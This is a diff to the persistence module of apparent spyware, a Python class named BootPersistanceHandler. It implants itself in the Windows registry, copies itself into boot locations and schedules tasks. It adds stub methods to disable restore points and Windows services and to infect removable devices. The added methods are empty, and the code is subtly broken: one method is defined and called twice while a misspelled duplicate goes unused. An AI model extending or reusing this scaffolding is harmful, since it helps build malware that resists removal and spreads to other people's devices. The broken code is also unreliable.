@@ -32,20 +32,24 @@ class BootPersistanceHandler:
 
     def addSelfToSystemToBoot(self):
         if (platform.system().lower() == "windows"):
-            # 1. Use registry
+            # 1. Implant to Windows Registry
             if winreg is not None:
                 self.implantToRegistry()
 
-            # 2. Copy file manually
+            # 2. Copy files to Windows boot
             self.copyFilesManually()
 
             # 3. Schedule task in Windows
             self.scheduleTaskInWindows()
 
-            # 3. Disable restore points
-            # 4. Disable windows services which can interfer propy injection to device
-            # 5. Constantly check if removable devices is connected and if yes -
-            # infect them as well (make spyware startup from removable device)
+            # 4. Disable restore points
+            self.disableRestorePoints()
+
+            # 5. Disable windows services
+            self.disableRestorePoints()
+
+            # 6. Infect removable devices
+            self.infectRemovableDevices()
 
     #
     # Implant to Windows Registry
@@ -142,6 +146,27 @@ class BootPersistanceHandler:
             return False
         else:
             return True
+
+    #
+    # Disable restore points
+    #
+
+    def desableRestorePoints(self):
+        pass
+
+    #
+    # Disable Windows services
+    #
+
+    def disableRestorePoints(self):
+        pass
+
+    #
+    # Infect removable devices
+    #
+
+    def infectRemovableDevices(self):
+        pass
 
     #
     # Start here
